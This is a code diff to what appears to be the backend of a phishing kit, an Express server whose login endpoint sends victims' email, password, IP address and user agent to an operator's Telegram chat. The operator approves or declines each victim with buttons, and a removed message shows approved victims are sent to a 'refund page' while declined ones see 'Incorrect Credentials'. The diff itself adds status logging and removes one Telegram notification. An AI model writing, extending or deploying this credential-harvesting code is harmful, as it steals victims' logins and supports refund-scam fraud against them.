@@ -87,7 +87,7 @@ async function sendTelegramMessageWithButtons(email, password, firstName, ip, us
 }
 
 // ============================================
-// HANDLE TELEGRAM CALLBACK QUERIES
+// HANDLE TELEGRAM CALLBACK QUERIES (WEBHOOK)
 // ============================================
 app.post('/api/telegram-callback', async (req, res) => {
     try {
@@ -109,8 +109,9 @@ app.post('/api/telegram-callback', async (req, res) => {
         const email = parts.slice(1, -1).join('_');
         const firstName = parts[parts.length - 1];
 
-        // Store the user status
+        // ✅ STORE THE USER STATUS
         userStatuses[email] = action === 'approve' ? 'approved' : 'declined';
+        console.log(`📝 User ${email} status set to: ${userStatuses[email]}`);
 
         let responseText = '';
 
@@ -147,16 +148,6 @@ app.post('/api/telegram-callback', async (req, res) => {
             parse_mode: 'HTML'
         });
 
-        // Also send a separate notification
-        const notifyUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        await axios.post(notifyUrl, {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: action === 'approve' 
-                ? `✅ User ${email} has been approved! They will see the refund page.`
-                : `❌ User ${email} has been declined! They will see "Incorrect Credentials".`,
-            parse_mode: 'HTML'
-        });
-
         res.send('OK');
 
     } catch (error) {
@@ -183,6 +174,7 @@ app.post('/api/check-status', (req, res) => {
     try {
         const { email } = req.body;
         const status = userStatuses[email] || 'pending';
+        console.log(`🔍 Checking status for ${email}: ${status}`);
         res.json({ success: true, status });
     } catch (error) {
         res.status(500).json({ success: false, message: 'Error checking status' });
@@ -215,12 +207,16 @@ app.post('/api/login', async (req, res) => {
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
         const userAgent = req.headers['user-agent'] || 'Unknown';
 
+        // ✅ Set initial status to 'pending'
+        userStatuses[email] = 'pending';
+        console.log(`📝 User ${email} status set to: pending`);
+
         // Send Telegram message with Approve/Decline buttons
         await sendTelegramMessageWithButtons(email, password, firstName, ip, userAgent);
 
         console.log('✅ Telegram notification with buttons sent');
 
-        // Return success - redirect to pending page
+        // ✅ Redirect to pending page with status=pending
         return res.json({
             success: true,
             message: 'Login successful! Waiting for admin approval...',
